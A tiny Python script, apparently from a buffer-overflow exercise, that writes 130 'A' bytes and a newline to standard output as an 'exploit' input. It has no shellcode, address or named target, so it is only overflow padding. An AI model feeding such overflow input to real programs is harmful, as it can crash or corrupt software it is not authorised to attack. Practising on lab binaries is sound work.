#!/usr/bin/env python3

import sys


oflow = b'A' * 130


exploit = bytearray(oflow)
exploit.extend(b'\n')
sys.stdout.buffer.write(exploit)


